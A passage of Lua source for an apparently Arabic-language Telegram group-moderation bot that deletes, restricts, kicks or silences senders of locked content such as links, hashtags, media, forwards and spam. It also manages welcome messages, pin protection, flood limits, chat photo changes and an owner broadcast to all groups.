Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:User:Name"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:User:Name"..msg.chat_id_) == "kick" and not Vips(msg) then    
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:User:Name"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("@[%a%d_]+") or text and text:match("@(.+)") then    
if redis:get(bot_id.."Hadaf:Lock:User:Name"..msg.chat_id_) == "del" and not Vips(msg) then    
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:User:Name"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:User:Name"..msg.chat_id_) == "kick" and not Vips(msg) then    
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:User:Name"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("#[%a%d_]+") or msg.content_.caption_:match("#(.+)") then 
if redis:get(bot_id.."Hadaf:Lock:hashtak"..msg.chat_id_) == "del" and not Vips(msg) then    
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:hashtak"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:hashtak"..msg.chat_id_) == "kick" and not Vips(msg) then    
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:hashtak"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("#[%a%d_]+") or text and text:match("#(.+)") then
if redis:get(bot_id.."Hadaf:Lock:hashtak"..msg.chat_id_) == "del" and not Vips(msg) then    
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:hashtak"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:hashtak"..msg.chat_id_) == "kick" and not Vips(msg) then    
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:hashtak"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("/[%a%d_]+") or msg.content_.caption_:match("/(.+)") then  
if redis:get(bot_id.."Hadaf:Lock:Cmd"..msg.chat_id_) == "del" and not Vips(msg) then    
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Cmd"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Cmd"..msg.chat_id_) == "kick" and not Vips(msg) then    
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Cmd"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("/[%a%d_]+") or text and text:match("/(.+)") then
if redis:get(bot_id.."Hadaf:Lock:Cmd"..msg.chat_id_) == "del" and not Vips(msg) then    
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Cmd"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Cmd"..msg.chat_id_) == "kick" and not Vips(msg) then    
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Cmd"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if not Vips(msg) then 
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or msg.content_.caption_:match(".[Pp][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or msg.content_.caption_:match("[Tt].[Mm][Ee]/") then 
if redis:get(bot_id.."Hadaf:Lock:Link"..msg.chat_id_) == "del" and not Vips(msg) then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Link"..msg.chat_id_) == "ked" and not Vips(msg) then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Link"..msg.chat_id_) == "kick" and not Vips(msg) then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Link"..msg.chat_id_) == "ktm" and not Vips(msg) then
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or text and text:match(".[Pp][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or text and text:match("[Tt].[Mm][Ee]/") and not Vips(msg) then
if redis:get(bot_id.."Hadaf:Lock:Link"..msg.chat_id_) == "del" and not Vips(msg) then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Link"..msg.chat_id_) == "ked" and not Vips(msg) then 
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Link"..msg.chat_id_) == "kick" and not Vips(msg) then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Link"..msg.chat_id_) == "ktm" and not Vips(msg) then
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessagePhoto" and not Vips(msg) then     
if redis:get(bot_id.."Hadaf:Lock:Photo"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Photo"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Photo"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Photo"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageVideo" and not Vips(msg) then     
if redis:get(bot_id.."Hadaf:Lock:Video"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Video"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Video"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Video"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageAnimation" and not Vips(msg) then     
if redis:get(bot_id.."Hadaf:Lock:Animation"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Animation"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Animation"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Animation"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.game_ and not Vips(msg) then     
if redis:get(bot_id.."Hadaf:Lock:geam"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:geam"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:geam"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:geam"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageAudio" and not Vips(msg) then     
if redis:get(bot_id.."Hadaf:Lock:Audio"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Audio"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Audio"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Audio"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageVoice" and not Vips(msg) then     
if redis:get(bot_id.."Hadaf:Lock:vico"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:vico"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:vico"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:vico"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and not Vips(msg) then     
if redis:get(bot_id.."Hadaf:Lock:Keyboard"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Keyboard"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Keyboard"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Keyboard"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageSticker" and not Vips(msg) then     
if redis:get(bot_id.."Hadaf:Lock:Sticker"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Sticker"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Sticker"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Sticker"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.forward_info_ and not Vips(msg) then     
if redis:get(bot_id.."Hadaf:Lock:forward"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif redis:get(bot_id.."Hadaf:Lock:forward"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif redis:get(bot_id.."Hadaf:Lock:forward"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif redis:get(bot_id.."Hadaf:Lock:forward"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageDocument" and not Vips(msg) then     
if redis:get(bot_id.."Hadaf:Lock:Document"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Document"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Document"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Document"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageUnsupported" and not Vips(msg) then      
if redis:get(bot_id.."Hadaf:Lock:Unsupported"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Unsupported"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Unsupported"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Unsupported"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.entities_ then 
if msg.content_.entities_[0] then 
if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then      
if not Vips(msg) then
if redis:get(bot_id.."Hadaf:Lock:Markdaun"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Markdaun"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Markdaun"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Markdaun"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end  
end 
end
end 

if tonumber(msg.via_bot_user_id_) ~= 0 and not Vips(msg) then
if redis:get(bot_id.."Hadaf:Lock:Inlen"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Inlen"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Inlen"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Inlen"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageContact" and not Vips(msg) then      
if redis:get(bot_id.."Hadaf:Lock:Contact"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Contact"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Contact"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Contact"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.text_ and not Vips(msg) then  
local _nl, ctrl_ = string.gsub(text, "%c", "")  
local _nl, real_ = string.gsub(text, "%d", "")   
sens = 400  
if redis:get(bot_id.."Hadaf:Lock:Spam"..msg.chat_id_) == "del" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Spam"..msg.chat_id_) == "ked" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Spam"..msg.chat_id_) == "kick" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Hadaf:Lock:Spam"..msg.chat_id_) == "ktm" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
local status_welcome = redis:get(bot_id.."Hadaf:Chek:Welcome"..msg.chat_id_)
if status_welcome and not redis:get(bot_id.."Hadaf:Lock:tagservr"..msg.chat_id_) then
if msg.content_.ID == "MessageChatJoinByLink" then
tdcli_function({ID = "GetUser",user_id_=msg.sender_user_id_},function(extra,result) 
local GetWelcomeGroup = redis:get(bot_id.."Hadaf:Get:Welcome:Group"..msg.chat_id_)  
if GetWelcomeGroup then 
t = GetWelcomeGroup
else  
t = "\n• نورت \n•  name \n• user" 
end 
t = t:gsub("name",result.first_name_) 
t = t:gsub("user",("@"..result.username_ or "لا يوجد")) 
send(msg.chat_id_, msg.id_,t)
end,nil) 
end 
end 
-------------------------------------------------------
if msg.content_.ID == "MessagePinMessage" then
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(bot_id) then 
redis:set(bot_id.."Hadaf:Get:Id:Msg:Pin"..msg.chat_id_,msg.content_.message_id_)
else
local Msg_Pin = redis:get(bot_id.."Hadaf:Get:Id:Msg:Pin"..msg.chat_id_)
if Msg_Pin and redis:get(bot_id.."Hadaf:lockpin"..msg.chat_id_) then
Pin_Message(msg.chat_id_,Msg_Pin)
end
end
end
--------------------------------------------------------------------------------------------------------------
if not Vips(msg) and msg.content_.ID ~= "MessageChatAddMembers" and redis:hget(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= bot_id then
floods = redis:hget(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = redis:hget(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = redis:hget(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(redis:get(bot_id.."Hadaf:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(redis:hget(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = redis:hget(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
redis:setex(bot_id.."Hadaf:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(redis:hget(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if redis:hget(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = redis:hget(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if redis:hget(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = redis:hget(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.photo_ then  
if redis:get(bot_id.."Hadaf:Set:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) then 
if msg.content_.photo_.sizes_[3] then  
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_ 
else 
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_ 
end 
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,"⚠️┇عذرًا البوت ليس مشرف يرجى وضعه مشرف بالقروب والمحاوله لاحقًا") 
redis:del(bot_id.."Hadaf:Set:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"⚠️┇ليس لدي صلاحية تغيير معلومات المجموعه يرجى المحاوله لاحقًا") 
redis:del(bot_id.."Hadaf:Set:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
else
send(msg.chat_id_, msg.id_,"🎇┇تم تغيير صورة المجموعه") 
end
end, nil) 
redis:del(bot_id.."Hadaf:Set:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
end   
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Hadaf:Broadcasting:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
print(text)
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_,msg.id_, "\n⚠️️┇تم الغاء الاذاعه للمجموعات") 
redis:del(bot_id.."Hadaf:Broadcasting:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = redis:smembers(bot_id.."Hadaf:ChekBotAdd") 
send(msg.chat_id_, msg.id_,"✅┇تمت الاذاعه الى *- "..#list.." * مجموعه في البوت ")     
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
redis:set(bot_id..'Hadaf:Msg:Pin:Chat'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
redis:set(bot_id..'Hadaf:Msg:Pin:Chat'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or "")) 
redis:set(bot_id..'Hadaf:Msg:Pin:Chat'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
redis:set(bot_id..'Hadaf:Msg:Pin:Chat'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
redis:del(bot_id.."Hadaf:Broadcasting:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
------------------------------------------------------------------------------------------------------------
